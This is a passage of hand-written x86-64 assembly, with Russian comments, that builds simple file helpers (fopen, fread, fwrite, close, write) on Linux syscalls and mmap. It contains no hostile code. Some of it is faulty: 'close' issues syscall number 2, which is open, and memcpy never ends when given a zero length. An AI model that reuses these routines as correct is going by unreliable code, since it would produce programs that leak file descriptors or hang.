    syscall

    popq    %rbp
	ret

#   принимает в rdi адрес,  по которому пишем
#   в rsi длину считываемого файла
#   в rdx - права на доступ к памяти
#   в rcx - флаги
#   в r8 - дескриптор файла, из которого читаем
#   в r9 - смещение от начала файла, из которого читаем
mmap:

    pushq   %rbp
	movq    %rsp, %rbp

    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10
	push %r14
	push %r15

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

	pop %r15
	pop %r14
	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

    popq    %rbp
	ret

# принимает в rdi указатель на назначение
# в rsi - указатель на источник
# в rdx - размер байт, которые надо записать
memcpy:

    pushq   %rbp
	movq    %rsp, %rbp

    pushq    %rcx
    pushq    %rax

    movq     %rdx, %rcx   # устанавливаем счетчик цикла

cycle_memcpy:

    movq	%rsi, %rax
    movzbl	(%rax), %edx

	movq	%rdi, %rax
	movb	%dl, (%rax)

    inc      %rdi       # инкрементируем оба указателя
    inc      %rsi

    loop     cycle_memcpy

memcpy_end:
    popq     %rax
    popq     %rcx

    popq     %rbp
    ret

# принимает в rdi имя файла
# в rsi - указатель на структуру типа stat
stat:
    mov     $0x04, %rax
    syscall

   	ret

# принимает в rdi имя файла,
# в rsi - флаги
fopen:
    push    %rbp
    mov     %rsp, %rbp

    call    open
    cmp     $0, %rax
    jle     fopen_end3

    sub     $200, %rsp

    push    %rsi    # сохранили флаги
    push    %rax    # сохранили дескриптор

    leaq    -160(%rbp), %rsi  # грузим указатель на структуру

    call    stat

    cmp     $0, %rax
    jl      fopen_end2

    pop     %rax    # восстановили дескриптор
    pop     %rsi    #восстановили флаги

    push    %rbx  # сохраняем регистры на всякий случай
    push    %rcx
    push    %rdx
    push    %r10
    push    %r9
    push    %r8

    mov     %rax, %r8           # занесли дескриптор файла
    mov     %rsi, %rax          # сохранили флаги
    mov     $0, %rdi            # установили адрес для записи (значение по умолчанию)

    MAP_PRIVATE %r10            # занесли флаг для mmap

    mov    -112(%rbp), %rsi     # занесли размер файла
    movq     $0, %r9            # занесли смещение

    O_RDONLY %rcx  # если файл был открыт на чтение

    cmp     %rcx,  %rax
    je      mmap_rdonly

    O_RDWR  %rcx           # если файл был открыт на запись и чтение
    cmp     %rcx,  %rax

    je      mmap_rdwr

mmap_none:

    PROT_NONE %rdx   # занесли права на доступ к памяти
    mov     $2, %rcx
    call    mmap               # указатель на выделенную память окажется в %rax
    jmp     fopen_end

mmap_rdwr:

    PROT_READ_OR_PROT_WRITE %rdx   # занесли права на доступ к памяти
    mov     $2, %rcx

    call    mmap                      # указатель на выделенную память окажется в %rax
    jmp     fopen_end

mmap_rdonly:
    PROT_READ %rdx   # занесли права на доступ к памяти
    mov     $2, %rcx

    call    mmap               # указатель на выделенную память окажется в %rax

fopen_end:

    pop     %r8
    pop     %r9
    pop     %r10
    pop     %rdx
    pop     %rcx
    pop     %rbx

    jmp     fopen_end3
fopen_end2:
    pop     %rsi
    pop     %rsi

fopen_end3:

    add     $200, %rsp
    pop     %rbp
	ret

# принимает в rdi на назначние
# в rsi - на источник
# в rdx - на кол-во итераций записи
# в rbx - на кол-во байт, которые надо считать за раз
fread:

    push    %rcx
    push    %rax

    movq    %rdx, %rcx   # устанавливаем счетчик цикла

cycle_fread:
    mov    %rbx, %rdx
    call    memcpy
    loop    cycle_fread

fread_end:
    pop     %rax
    popq    %rcx
	ret

# принимает в rdi дескриптор файла
close:
    mov     $0x2, %rax
    syscall

	ret

 # принимает в rdi дескриптор файла
 # в rsi - указатель на строку
 # в rdx - размер строки
write:

    mov     $0x1, %rax
    syscall

	ret

# принимает к rdi назначение
# в rsi - источник
# в rdx - кол-во байт, которое надо считать
# возвращает измененный указатель на назначение (назначение + кол-во записанных байт)
fwrite:

    pushq   %rbp
	movq    %rsp, %rbp

    call    memcpy

    mov     %rdi, %rax
    popq    %rbp
	ret
array:
    .space 40

stack_begin:
    .space 3000, 0
stack_end:
    call _count_memory
